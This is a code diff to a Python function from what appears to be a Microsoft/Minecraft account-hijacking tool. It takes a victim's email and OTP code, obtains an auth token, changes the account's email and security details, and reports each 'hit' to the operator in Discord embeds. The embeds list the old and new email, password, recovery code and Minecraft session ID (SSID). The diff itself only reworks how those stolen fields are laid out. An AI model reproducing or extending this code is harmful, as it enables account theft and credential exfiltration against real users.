@@ -12,14 +12,10 @@ async def startSecuringAccount(email: str, device: str = None, code: str = None)
     
     data = await getLiveData() # {urlPost, ppft, cookies, headers}
 
-    # str or None | dict
-    # urlPost, ppft
     msaauth = await getMSAAUTH(email, device, data, code)
-
-    # WLSSC = getWLSSC(msaauth, urlPost, ppft)
     
     if not msaauth:
-        print("[-] - Failed to get MSAAUTH")
+        print("[-] - Failed to get MSAAUTH | Invalid OTP Code")
         return None
     
     print("[+] - Got MSAAUTH | Starting to secure...")
@@ -38,40 +34,29 @@ async def startSecuringAccount(email: str, device: str = None, code: str = None)
     infoEmbed.add_field(name="Birthday", value=f"```{account['birthday']}```", inline=False)
 
     hitEmbed = Embed(
-        title = f"New Hit!",
+        title = f"Took {round(finalTime, 2)} seconds securing!",
         color = 0xE4D00A
     )
 
     # Once primaryEmail is done oldEmail -> Email
-    hitEmbed.add_field(name="👤 Username", value=f"```{account['oldName']}```", inline=False)
-    hitEmbed.add_field(name="🛠 Method", value=f"```{account['method']}```", inline=True)
-    hitEmbed.add_field(name="🎽 Capes", value=f"```{account['capes']}```", inline=True)
-    hitEmbed.add_field(name="📧 Old Email", value=f"```{account['oldEmail']}```", inline=False)
-    hitEmbed.add_field(name="📧 New Email", value=f"```{account['email']}```", inline=False)
-    hitEmbed.add_field(name="📩 Security Email", value=f"```{account['secEmail']}```", inline=True)
-    hitEmbed.add_field(name="🔒 Password", value=f"```{account['password']}```", inline=False)
-    hitEmbed.add_field(name="🧯 Recovery Code", value=f"```{account['recoveryCode']}```", inline=False)
-    hitEmbed.set_footer(text = f"Took {round(finalTime, 2)} seconds securing!")
-    
-    mcEmbed = Embed()
+    hitEmbed.add_field(name="MC Username", value=f"```{account['oldName']}```", inline=False)
+    hitEmbed.add_field(name="MC Method", value=f"```{account['method']}```", inline=True)
+    hitEmbed.add_field(name="MC Capes", value=f"```{account['capes']}```", inline=True)
+    hitEmbed.add_field(name="Old Email", value=f"```{account['oldEmail']}```", inline=False)
+    hitEmbed.add_field(name="New Email", value=f"```{account['email']}```", inline=False)
+    hitEmbed.add_field(name="Security Email", value=f"```{account['secEmail']}```", inline=True)
+    hitEmbed.add_field(name="Password", value=f"```{account['password']}```", inline=False)
+    hitEmbed.add_field(name="Recovery Code", value=f"```{account['recoveryCode']}```", inline=False)
 
-    if account["method"] == "Purchased":
+    if account["method"] != "No Minecraft":
+        
+        ssidEmbed = Embed()
+        ssidEmbed.add_field(name="**SSID**", value=f"```{account['SSID']}```", inline=False)
 
-        mcEmbed.add_field(name="**Current Username**", value=f"```{account['oldName']}```", inline=False)
-        mcEmbed.add_field(name="**Is Username Changeable**", value=f"```{account['usernameInfo']}```", inline=False)       
-        mcEmbed.add_field(name="**SSID**", value=f"```{account['SSID']}```", inline=False)
-        mcEmbed.color = 0x50C878
+        ssidEmbed.color = 0x50C878
 
-        hitEmbed.set_thumbnail(url = f"https://mineskin.eu/avatar/{account["oldName"]}")
-        hitEmbed.color = 0x50C878
-    
-    else:
-
-        mcEmbed.description = "**This account does not own Minecraft**"
-        mcEmbed.color = 0xFF5C5C
 
     return [
         hitEmbed,
-        infoEmbed,
-        mcEmbed
+        ssidEmbed
     ]
